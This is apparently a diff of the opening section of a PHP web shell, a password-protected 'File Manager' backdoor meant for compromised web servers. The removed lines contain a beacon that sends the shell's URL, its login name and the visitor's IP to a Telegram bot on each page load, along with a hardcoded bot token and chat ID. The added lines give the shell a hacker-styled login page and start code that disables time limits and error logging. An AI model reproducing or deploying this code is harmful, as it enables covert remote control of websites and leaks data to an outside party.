@@ -1,54 +1,107 @@
 <?php
-# Konfigurasyon
-$sayfaSifreleme = "1"; # 1 acik , 0 kapali
-$kullaniciAdi = "human";
-$sifre = "password";
-$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
-$chatId = '5070938778';
-$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$logMessage  = "___MINI URLUBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $kullaniciAdi \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-sendTelegramMessage($botToken, $chatId, $logMessage);
+session_start();
 
-function sendTelegramMessage($botToken, $chatId, $message)
-{
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $params = [
-        'chat_id' => $chatId,
-        'text' => $message,
-    ];
-    $options = [
-        'http' => [
-            'method' => 'POST',
-            'header' => 'Content-Type: application/x-www-form-urlencoded',
-            'content' => http_build_query($params),
-        ],
-    ];
-    $context = stream_context_create($options);
-    $response = file_get_contents($url, false, $context);
+$hashedPassword = '$2y$10$kABM1qHenbce502CJlEN5OthrsRNtRlhfgbUuQ0aezkoUsWO5mlVm'; // adminbl
 
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
 }
 
-# yetki kontrol fonksiyonu
-function yetkiKontrol($kullaniciAdi, $sifre)
-{
-    if (
-        empty($_SERVER["PHP_AUTH_USER"]) ||
-        empty($_SERVER["PHP_AUTH_PW"]) ||
-        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
-        $_SERVER["PHP_AUTH_PW"] != "$sifre"
-    ) {
-        header('WWW-Authenticate: Basic realm="x"');
-        die(header("HTTP/1.0 401 Unauthorized"));
+if (!isset($_SESSION['authenticated'])) {
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        if (password_verify($_POST['password'], $hashedPassword)) {
+            $_SESSION['authenticated'] = true;
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit;
+           
+        } else {
+            $error = "Password salah!";
+        }
     }
-}
 
-# Sayfa Sifreleme aciksa
-if ($sayfaSifreleme == "1") {
-    # Veri ve sifre kontrolu
-    yetkiKontrol($kullaniciAdi, $sifre);
-}
-?><?php
-@session_start();
+    // Login form
+    ?>
+    <!DOCTYPE html>
+<html>
+<head>
+    <title>Login - File Manager</title>
+    <style>
+        body {
+            background: url("https://res.cloudinary.com/dcbepa88c/image/upload/v1745222959/thumb-1920-1010066_iuubht.jpg");
+            /* background-color: var(--first-color); */
+            color: var(--second-color);
+            background-size: cover !important;
+            background-attachment: fixed !important;
+            background-position-x: center !important;
+            background-position-y: center !important;
+            font-family: 'arial';
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            text-align: center;
+            border: 2px solid #00FF00;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+            width: 300px;
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background for the login container */
+        }
+        h2 {
+            color: #00FF00;
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        input[type="password"] {
+            background-color: black;
+            color: #00FF00;
+            border: 2px solid #00FF00;
+            padding: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: black;
+            color: #00FF00;
+            border: 2px solid #00FF00;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        input[type="submit"]:hover {
+            background-color: #00FF00;
+            color: black;
+        }
+        .error-message {
+            color: red;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Secure Terminal Access</h2>
+        <?php if (isset($error)) echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';?>
+        <form method="POST">
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>
+<?php
+session_start();
 @set_time_limit(0);
 @clearstatcache();
 @ini_set("error_log", null);
